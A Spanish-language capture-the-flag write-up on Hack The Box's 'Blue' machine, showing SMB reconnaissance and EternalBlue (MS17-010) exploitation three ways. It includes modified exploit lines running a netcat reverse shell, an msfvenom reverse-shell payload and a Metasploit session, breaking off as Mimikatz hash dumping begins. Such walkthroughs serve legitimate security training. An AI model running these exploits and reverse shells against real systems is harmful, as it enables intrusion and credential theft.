---
title: "Blue - Hack The Box"
date: 2023-01-18
draft: false
slug: "htb-writeup-blue"
excerpt: "Una máquina relativamente fácil, ya que usamos un Exploit muy conocido que hace juego con el nombre de la máquina y que hay una historia detrás de su obtención, siendo que este Exploit supuestamente fue robado a la NCA. Haremos uso del famoso Exploit Eternal Blue para ganar acceso como un usuario administrador, aprovecharemos para utilizar otras herramientas para obtener información sobre el servicio SMB y la máquina."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "SMB", "Remote Code Execution (RCE)", "Eternal Blue MS17-010 (RCE)", "Reverse Shell", "Privesc - Eternal Blue MS17-010 (RCE)", "Mimikatz", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "smbclient"
  - "python2"
  - "Impacket"
  - "rlwrap"
  - "msfvenom"
  - "nc"
  - "metasploit framework"
  - "Módulo: auxiliary/scanner/smb/smb_ms17_010)"
  - "Módulo: exploit/windows/smb/ms17_010_eternalblue"
  - "mimikatz.exe"
  - "certutil.exe"
links:
  - "https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit"
  - "https://www.avast.com/es-es/c-eternalblue"
  - "https://www.exploit-db.com/exploits/42315"
  - "https://github.com/worawit/MS17-010"
  - "https://www.elladodelmal.com/2018/01/named-pipe-impersonation-escalando.html"
  - "https://resources.infosecinstitute.com/topics/penetration-testing/mimikatz-walkthrough/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-blue/blue_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Veamos si la máquina está conectada, lancemos un ping y veamos que SO opera gracias al TTL.
```bash
ping -c 4 10.10.10.40 
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=128 ms
64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=130 ms
64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=130 ms
64 bytes from 10.10.10.40: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.40 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 128.426/129.686/130.894/0.884 ms
```
Vemos que la máquina tiene el sistema Windows, empecemos ahora con los escaneos.

### Escaneo de Puertos {#Puertos}

Vamos a buscar que puertos están abiertos en esta máquina:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts             

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 13:28 CST
Initiating SYN Stealth Scan at 13:28
Scanning 10.10.10.40 [65535 ports]
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Completed SYN Stealth Scan at 13:29, 48.37s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.59s latency).
Scanned at 2023-01-18 13:28:52 CST for 49s
Not shown: 41657 filtered tcp ports (no-response), 23872 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.61 seconds
           Raw packets sent: 227709 (10.019MB) | Rcvd: 24244 (969.820KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos varios puertos abiertos, pero ya podemos deducir que la máquina usa el **servicio SMB**. Ahora vamos al escaneo de servicios.

### Escaneo de Servicios {#Servicios}

Aplicando escaneo de servicios a los puertos abiertos:
```bash
nmap -sC -sV -p135,139,445,49152,49154,49156 10.10.10.40 -oN targeted              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 13:31 CST
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-01-18T19:32:34+00:00
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-18T19:32:33
|_  start_date: 2023-01-18T19:27:28
|_clock-skew: mean: 5s, deviation: 1s, median: 4s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.54 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Aquí vemos que se usa el **servicio SMB** bastante, podemos ver información extra sobre el **SMB**, veamos un par de cositas que nos dice este escaneo.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando y Probando Servicio SMB {#smb}

Vamos a aplicar unos scripts de **nmap** para obtener más información sobre el **servicio SMB**, pruebalos:

* **Script de reconocimiento de protocolos SMB**:

```bash
nmap -p 445 --script smb-protocols 10.10.10.40
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.10.40
Host is up (0.063s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:

| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     202
|_    210

Nmap done: 1 IP address (1 host up) scanned in 3.95 seconds
```
Este script muestra el protocolo de red que usa el **servicio SMB**, existen varios como el **SMBv1, SMBv2, SMBv2.1, SMBv3 y SMBv3.X**. El **SMBv1** es el más vulnerable y es el que nos será útil más adelante.

* **Script de reconocimiento de seguridad de SMB**:

```bash
nmap -p 445 --script smb-security-mode 10.10.10.40
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.10.40
Host is up (0.063s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:

| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 1.64 seconds
```
Este script nos va a mostrar el modo de seguridad que usa el **servicio SMB**, existen varios como la sin seguridad (None), autenticación (Authentication), firma de mensajes (Message Signing) y cifrado (Encryption).

Observa que en este caso, tiene activado el modo de autenticación activado, pero la firma de mensajes esta desactivada, lo cual es peligroso tal y como nos menciona el script, pues puede haber riesgo de manipulación de datos, suplantación de identidad y se puede compremeter la integridad de las comunicaciones.

En este caso, el nivel de autenticación es por invitado, es decir, que nos podemos conectar al **servicio SMB**, lo probaremos más adelante.

* **Script de reconocimiento de recursos compartidos**:

```bash
nmap -p 445 --script smb-enum-shares 10.10.10.40
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 10.10.10.40
Host is up (0.077s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:

| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.40\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.10.40\Share: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.10.40\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 44.44 seconds
```
Este script nos sirve para ver los archivos compartidos que hay en el **servicio SMB**, en este caso, vemos varios recursos dentro del SMB, es posible que podamos ver lo que contienen con un par de herramientas que veremos más adelante.

* **Script de reconocimiento de vulnerabilidades de NMAP para SMB**

Dentro de **nmap**, existen muchos scripts de reconocimientos, separados por categorias, veamos que categorias maneja **nmap**:
```bash
locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u
"auth"
"broadcast"
"brute"
"default"
"discovery"
"dos"
"exploit"
"external"
"fuzzer"
"intrusive"
"malware"
"safe"
"version"
"vuln"
```

Vemos varias, las que nos pueden interesar en este momento son la de **vuln, discovery, intrusive, auth y brute**, pero vamos a usar la de **vuln** unicamente, para que podamos encontrar a que es vulnerable el **SMB** y usaremos la categoria **safe**, para que sea de forma segura y no hagamos tanto ruido en el sistema a escanear:
```bash
nmap --script "vuln and safe" -p445 10.10.10.40 -oN smbVulnScan
Nmap 7.93 scan initiated Jan 19 12:42:40 2023 as: nmap --script "vuln and safe" -p445 -oN smbVulnScan 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.14s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done at Jan 19 12:42:44 2023 -- 1 IP address (1 host up) scanned in 4.35 seconds
```

Observa que ya nos dio un Exploit al que es vulnerable el **servicio SMB** de la máquina víctima, esto lo usaremos más adelante. Es momento de probar la herramienta **smbclient**.

### Probando Herramienta smbclient {#herra}

Recordemos que podemos loguearnos como invitados en el **servicio SMB**, vamos a probarlo con esta herramienta, pero primero veamos si podemos listar los recursos compartidos:
```bash
smbclient -L 10.10.10.40                                       
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Bien, podemos ver 5 recursos, veamos si podemos loguearnos a alguno de estos:
```bash
smbclient //10.10.10.40/ADMIN
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
.
smbclient //10.10.10.40/C
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
.
smbclient //10.10.10.40/IPC
Password for [WORKGROUP\root]:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
.
smbclient //10.10.10.40/Share
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jul 14 08:48:44 2017
  ..                                  D        0  Fri Jul 14 08:48:44 2017

                4692735 blocks of size 4096. 658102 blocks available
smb: \> exit
.
smbclient //10.10.10.40/Users
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Jul 21 01:56:23 2017
  ..                                 DR        0  Fri Jul 21 01:56:23 2017
  Default                           DHR        0  Tue Jul 14 02:07:31 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:54:24 2009
  Public                             DR        0  Tue Apr 12 02:51:29 2011

                4692735 blocks of size 4096. 658102 blocks available
smb: \> cd Public
smb: \Public\> dir
  .                                  DR        0  Tue Apr 12 02:51:29 2011
  ..                                 DR        0  Tue Apr 12 02:51:29 2011
  desktop.ini                       AHS      174  Mon Jul 13 23:54:24 2009
  Documents                          DR        0  Tue Jul 14 00:08:56 2009
  Downloads                          DR        0  Mon Jul 13 23:54:24 2009
  Favorites                         DHR        0  Mon Jul 13 21:34:59 2009
  Libraries                         DHR        0  Mon Jul 13 23:54:24 2009
  Music                              DR        0  Mon Jul 13 23:54:24 2009
  Pictures                           DR        0  Mon Jul 13 23:54:24 2009
  Recorded TV                        DR        0  Tue Apr 12 02:51:29 2011
  Videos                             DR        0  Mon Jul 13 23:54:24 2009

                4692735 blocks of size 4096. 658102 blocks available
smb: \Public\> exit
```
Como contraseña, estoy usando cualquiera, pero como podras ver, no tenemos acceso a ninguna de las importantes, solamente tenemos acceso a Shares y Users, pero en ambas no hay nada que podamos usar ni que nos sea útil. 

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando y Configurando un Exploit {#Exploit}

Vamos a buscar un Exploit con la herramienta **Searchsploit**, recuerda que ya descubrimos que es vulnerable al **Eternal Blue**, podemos buscarlo de esta manera o por su CVE que es **MS17-010**:

* **MS17-010**:

```bash
searchsploit MS17-010
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path

|---|---|
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)                                                                                | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                                                                                            | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                                         | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                     | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                                                                               | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                                                                                            | windows_x86-64/remote/41987.py

|---|---|
Shellcodes: No Results
Papers: No Results
```

En este punto, vamos a utilizar tres versiones de este Exploit, usaremos una versión de github que me ayudara a explicar un poco mejor como funciona este Exploit, la versión de **Searchsploit** y la que tiene Metasploit. Primero, usemos la de **GitHub**.

### Probando Exploit EternalBlue de GitHub {#exploit1}

Vamos a clonar el siguiente repositorio:
* <a href="https://github.com/worawit/MS17-010" target="_blank">Repositorio de Worawit: MS17-010</a>

Clonalo:
```bash
git clone https://github.com/worawit/MS17-010.git
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Counting objects: 100% (131/131), done.
remote: Compressing objects: 100% (45/45), done.
remote: Total 183 (delta 88), reused 86 (delta 86), pack-reused 52
Recibiendo objetos: 100% (183/183), 107.30 KiB | 779.00 KiB/s, listo.
Resolviendo deltas: 100% (104/104), listo.
```

Bien, en este caso, tenemos muchas opciones para usar, si recordamos los escaneos que hicimos previamente, sabemos que la máquina usa **Windows 7**, aunque aca tienen una versión para este SO, es mejor utilizar el **script zzz_exploit.py**, ya que engloba varias versiones de **Windows** y bueno...es el mismo exploit que vamos a usar después.

Para usar correctamente este Exploit, necesitamos saber las **named pipes** que estan encendidas en el **servicio SMB**, para esto, usaremos el **script checker.py** y usamos cualquiera que nos de. Lo que vamos a realizar, es un **Named Pipes Impersonation**.

| **Named Pipes Impersonation** |
|:-----------:|
| *Es una técnica que permite escalar privilegios. Un named pipe es una técnica que tiene el sistema operativo Windows para facilitar la comunicación entre procesos. Es sencillo, si un proceso quiere "contactar" con otro, el primero de los procesos puede enviar un mensaje sobre la red o utilizar un fichero. En el segundo caso, el proceso escribe el mensaje en un fichero y el otro proceso lo lee.* |

```bash
python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```
Excelente, en mi caso voy a usar la de **samr**, intenta con las demás si quieres probar si con todas funciona este Exploit.

| **Protocolo SAMR** |
|:-----------:|
| *El Protocolo Remoto del Administrador de Cuentas de Seguridad (SAMR) es una parte de SMB, que proporciona administración remota de información de cuentas y políticas de seguridad para sistemas basados en Windows. SAMR es un protocolo RPC (Remote Procedure Call) construido sobre el protocolo SMB, que permite la comunicación entre sistemas cliente y servidor.* |

Ahora, modificaremos un poco el script para que podamos cargar y ejecutar una **netcat** dentro de la máquina víctima, entonces necesitaremos una netcat que se pueda ejecutar en Windows y activar recursos compartidos a nivel de red con **Impacket** para cargar la **netcat**, hagamoslo por pasos:

* Modificando el script:
```bash
USERNAME = 'guest'
.
ANTES: service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
DESPUES: service_exec(conn, r'cmd /c C:\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP 443')
```

* Buscando y descargando **netcat**:
```bash
locate nc.exe
.
cp cp /usr/share/windows-resources/binaries/nc.exe .
```
**NOTA**: La **netcat** debe ser para arquitectura de **64 bits**, pues esta es la arquitectura que maneja la máquina. Por lo que se, Kali ya cuenta con uno en sus binarios de windows, pero puedes descargar una desde internet por si las dudas: <a href="https://eternallybored.org/misc/netcat/" target="_blank">Netcat 32bits y 64bits</a>

* Abriendo un archivo compartido a nivel de red de nuestro directorio actual de trabajo (osease, donde tengamos la **nc.exe**) con **Impacket** y le damos soporte de **SMBv2** por si las dudas:
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
.
[*] Config file parsed
[*] Callback added for ...
...
...
```

* Abriendo una **netcat** en nuestra máquina con **rlwrap**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

* Y activamos el script:
```bash
python2 zzz_exploit.py 10.10.10.40 samr
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800332fba0
SESSION: 0xfffff8a0039a56e0
...
Done
```

Y observa el **rlwrap**, ya debemos tener una sesión activada:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Entramos justo como administrador de la máquina, ya solo es cuestión de buscar las flags y listo, vayamos con las otras formas de ganar acceso a la máquina.

### Probando Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) {#exploit2}

Vamos a descargarlo y veamos si tiene un mensaje sobre como usarlo:
```bash
searchsploit -m windows/remote/42315.py
  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
      URL: https://www.exploit-db.com/exploits/42315
     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
    Codes: CVE-2017-0144
 Verified: True
File Type: Python script, ASCII text executable
```
Como tal, no viene información sobre como usarlo, menciona que debemos usar otro script llamado **mysmb.py**, quiza si buscamos en internet, podamos encontrar algo útil.

Y justo nos sale un GitHub con el Exploit que vamos a usar:
* <a href="https://github.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit" target="_blank">Repositorio de AnikateSawhney: Pwning_Blue_From_HTB_Without_Metasploit</a>

Leyéndolo un poco, menciona que este Exploit necesita usar un entorno virtual en **Python2**, aunque realmente no es necesario si es que tienes instalado **Python2** en tu entorno, así que solamente evitaremos ese paso.

Vamos a configurar el Exploit por pasos.

* Cambiando nombre de Exploit (opcional):
```bash
mv 42315.py Eternal_Blue.py
```

* Descargando **mysmb.py**:
```bash
wget https://raw.githubusercontent.com/AnikateSawhney/Pwning_Blue_From_HTB_Without_Metasploit/main/mysmb.py
```

* Creando **Reverse Shell** con **Msfvenom**:
```bash
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=Tu_IP LPORT=443 > eternal-blue.exe
```

* Modificando el Exploit con algunos datos:
```bash
USERNAME = 'guest'
ANTES: smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') 
DESPUES: smb_send_file(smbConn, '/Path_Donde_Esta_El_Reverse_Shell/eternal-blue.exe' 'C', '/eternal-blue.exe')
.
ANTES: service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
DESPUES: service_exec(conn, r'cmd /c c:\eternal-blue.exe')
```

Una vez ya listo, vamos a activar una **netcat** que es ahí donde se conectara el script y luego lo activamos:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

* Activando script:
```bash
python2 Exploit_Blue.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
...
Done
```

* Resultado en **netcat**:
```
nc -nvlp 443
listening on [any] 443 ...
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```
Excelente, ya solamente nos falta probar con el **Metasploit Framework**.

### Probando EternalBlue en Metasploit Framework {#exploit3}

Primero debemos entrar a la consola de **Metasploit** y buscaremos el Exploit **eternal blue**:
```bash
msfconsole

search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Vamos a ocupar el escaner para saber si es vulnerable al eternal blue y luego usaremos el Exploit:
```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Y veamos que necesita este modulo para funcionar correctamente:
```bash
show options
.
Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)
```

Necesitamos unicamente meter la IP de la máquina víctima y como conocemos el usuario, vamos a meterlo también:
```bash
set RHOSTS 10.10.10.40
.
set SMBUser guest
```

Y lo ejecutamos:
```bash
exploit
.
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Excelente, nos menciona que si es probablemente vulnerable, entonces usemos el modulo del Exploit:
```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Veamos las opciones:
```bash
show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     X.X.X.X  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Igual, necesitamos la IP de la máquina víctima, el usuario y recuerda verificar tu IP:
```bash
set RHOSTS 10.10.10.40
.
set SMBUser guest
```
Y ejecutamos el modulo:
```bash
exploit
.
[*] Started reverse TCP handler on X.X.X.X:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (X.X.X.X:4444 -> 10.10.10.40:49158) -0600
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
.
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
```

Listo, hemos obtenido acceso a la máquina de 3 formas distintas, es momento de ver que podemos hacer en las **Post Explotación**.

## Post Explotación {#Post}

En esta parte, vamos a recolectar información útil del sistema tanto en el **Metasploit Framework** como de forma libre.

### Dumpeando Hashes con Módulo Kiwi en Metasploit Framework {#mimik}

Para usarlo, debemos cargar el **módulo Kiwi**:
```bash
